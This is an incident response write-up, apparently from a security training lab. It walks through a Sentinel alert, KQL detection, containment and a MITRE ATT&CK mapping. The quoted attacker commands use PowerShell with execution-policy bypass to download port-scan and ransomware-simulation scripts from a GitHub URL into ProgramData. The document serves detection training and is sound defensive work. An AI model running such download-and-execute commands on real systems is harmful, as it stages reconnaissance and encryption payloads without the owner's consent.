# PowerShell Suspicious Web Request & Multi-Stage Payload Delivery

![Tools](https://img.shields.io/badge/Microsoft_Sentinel-0078D4?style=flat&logo=microsoftazure&logoColor=white)
![Tools](https://img.shields.io/badge/Microsoft_Defender_for_Endpoint-00B294?style=flat&logo=microsoft&logoColor=white)
![Tools](https://img.shields.io/badge/KQL-F2C811?style=flat&logo=azuredataexplorer&logoColor=black)
![Tools](https://img.shields.io/badge/Azure_Log_Analytics-0089D6?style=flat&logo=microsoftazure&logoColor=white)

---

## Scenario

A Microsoft Sentinel scheduled query rule was configured to detect PowerShell using `Invoke-WebRequest` to download remote content with execution policy restrictions bypassed. The rule fired on a monitored Windows endpoint, generating a high-severity incident requiring immediate investigation.

> **Note:** The KQL query used a targeted device filter to scope results for this exercise. In a production environment, the rule would apply across all enrolled endpoints.
> 
<img width="870" height="565" alt="image" src="https://github.com/user-attachments/assets/00a8aa8b-d00b-45d0-8915-e76b3156793e" />

---

## Incident Details

| Field | Detail |
|---|---|
| **Severity** | High |
| **Detection Source** | Microsoft Sentinel – Scheduled Query Rule |
| **Affected Device** | `windows-target-[redacted]` |
| **Analyst** | Michael Edwards – Cybersecurity Engineer |
| **Tools Used** | Microsoft Sentinel, Microsoft Defender for Endpoint, KQL, Azure Log Analytics |

---

## NIST 800-61 Incident Response Lifecycle

### 1. Preparation

Prior to beginning the investigation, scope and role assignments were established:

- **Cybersecurity Engineer:** Michael Edwards
- **Supporting Teams:** Malware Reverse Engineering

Verified that the relevant log sources (`DeviceProcessEvents`, `DeviceFileEvents`) were actively flowing into Log Analytics before the alert rule was created.

---

### 2. Detection & Analysis

The Sentinel scheduled query rule triggered an active incident flagged at **High Severity**.

#### KQL Detection Query

```kql
DeviceProcessEvents
| where FileName == "powershell.exe"
| where ProcessCommandLine has "Invoke-WebRequest"
| where DeviceName == "windows-target-[redacted]"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

#### Malicious Commands Identified

<img width="975" height="478" alt="image" src="https://github.com/user-attachments/assets/51d2a2e1-2db4-44d2-8b45-a307ec9057b4" />


Three PowerShell commands were executed on the target device, each using `-ExecutionPolicy Bypass` to circumvent execution policy controls:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest `
  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 `
  -OutFile C:\programdata\portscan.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest `
  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 `
  -OutFile C:\programdata\pwncrypt.ps1

powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest `
  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 `
  -OutFile C:\programdata\eicar.ps1
```

#### Payload Analysis

| Script | Type | Description |
|---|---|---|
| `eicar.ps1` | AV Test | Generates an EICAR antivirus test file to probe security tool detection |
| `portscan.ps1` | Reconnaissance | Scans internal hosts and common ports for network discovery |
| `pwncrypt.ps1` | Ransomware Simulation | Encrypts sample files and drops a ransom note |

All three scripts were written to `C:\ProgramData\`, a commonly abused directory due to its broad write permissions.

#### User Interview

The affected user was contacted to establish context around the time the logs were generated. The user stated they attempted to download a piece of free software from the internet. They noted a black terminal window appeared briefly and then disappeared — consistent with a hidden PowerShell execution triggered by a malicious installer or script.

#### Process Event Confirmation

`DeviceProcessEvents` confirmed multiple executions of `powershell.exe` with the `-ExecutionPolicy Bypass -File` parameter referencing all three scripts from `C:\ProgramData\`. This confirms the scripts were launched by PowerShell after being written to disk.

<img width="975" height="469" alt="image" src="https://github.com/user-attachments/assets/a001b79f-16c6-4bc6-ac72-af12736d9e13" />


> Additional investigation of `DeviceFileEvents` would be required to confirm whether the scripts completed execution and whether any downstream file modifications or network connections occurred.

---

### 3. Containment & Eradication

- **Isolated** the affected endpoint via Microsoft Defender for Endpoint to prevent lateral movement or C2 communication
- **Initiated AV scan** on the isolated device to identify and quarantine any malicious artifacts
- **Scripts escalated** to the malware reverse engineering team for static and dynamic analysis
- **Restored device** from a known-good backup following confirmation of malicious activity

<img width="711" height="437" alt="image" src="https://github.com/user-attachments/assets/f5ab6d59-0928-4a20-9dc7-257fbaf334b5" />


---

### 4. Post-Incident Activity

- **User enrolled** in mandatory cybersecurity awareness training focused on software download risks and social engineering
- **PowerShell execution policy restriction** implemented via policy to limit unauthorized script execution across endpoints

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Execution | PowerShell | T1059.001 |
| Defense Evasion | Execution Policy Bypass | T1059.001 |
| Command & Control / Ingress | Ingress Tool Transfer | T1105 |
| Discovery | Network Service Discovery | T1046 |
| Impact | Data Encrypted for Impact | T1486 |

---

## Key Takeaways

- `C:\ProgramData\` is a high-signal directory for malicious file writes — monitoring file creation events here provides early detection of staged payloads
- PowerShell with `-ExecutionPolicy Bypass` combined with `Invoke-WebRequest` is a reliable detection pattern for script-based payload delivery
- Multi-payload drops (recon + ransomware simulation + AV probe) suggest a structured, staged attack rather than isolated experimentation
- User interview is a fast, low-cost triage step that can rapidly contextualize automated alerts and narrow investigation scope
